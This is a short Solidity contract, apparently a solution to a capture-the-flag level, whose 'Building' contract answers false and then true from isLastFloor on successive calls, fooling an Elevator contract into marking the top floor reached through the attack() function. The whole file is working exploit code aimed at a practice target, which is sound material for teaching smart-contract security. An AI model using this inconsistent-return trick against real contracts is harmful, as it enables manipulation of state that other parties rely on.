// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IBuilding} from "./interface/IBuilding.sol";
import {Elevator} from "./Elevator.sol";

contract Building is IBuilding {
    bool isTop;
    Elevator private immutable _ELEVATOR;

    constructor(Elevator elevator) {
        _ELEVATOR = elevator;
    }

    function attack() public {
        _ELEVATOR.goTo(type(uint256).max);
    }

    function isLastFloor(uint256) public returns (bool) {
        bool tempIsTop = isTop;
        isTop = !tempIsTop;
        return tempIsTop;
    }
}
